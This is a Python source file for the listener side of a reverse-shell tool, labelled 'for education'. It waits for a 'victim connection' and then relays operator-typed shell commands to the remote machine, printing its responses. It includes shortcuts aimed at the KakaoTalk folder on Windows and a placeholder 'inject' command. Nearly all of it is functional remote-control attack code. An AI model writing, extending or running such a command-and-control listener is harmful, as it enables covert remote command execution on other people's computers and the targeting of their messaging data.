#attack_server.py
import socket
import os,time
import ascii_quokka as ascii_quokka

VERSION="develop 1.0 , for education by jeho"

HOST = '0.0.0.0' # i don't know my ip, router!
PORT = 9001 #empty port of host

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print(VERSION)

os.system('pause') #ascii 가 깨지지 않도록 interrupt

ascii_quokka.print_ascii(VERSION)

while(True):
    port_input =input("input port to listen :")
    if(port_input==''):
        continue
    else:
        PORT = int(port_input)
    break

def bind_listen(sock,host,port):
    try:
        sock.bind((host, port))
        print(f"Listening : {port}")
    except socket.error as e:
        print(f"Listening Fail : {e}")
        os.system('pause')
    sock.listen(1)
    print('Waiting for victim connection...')

bind_listen(my_sock,HOST,PORT)

conn, addr = my_sock.accept()
print('\n')
print('Connected by', addr)
while True:
    try:
        cmd = input('$')
        if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
            ##Quick command
            if(cmd==":cdkakao"):
                cmd="cd C:\Program Files (x86)\Kakao\KakaoTalk"
            if(cmd==":injkakao"):
                cmd="asdf"
            ##File command

            conn.send(cmd.encode())
            print("wait for client message...")
            client_response = conn.recv(2048)
            print(client_response.decode())
    except Exception as e:
        print(e)
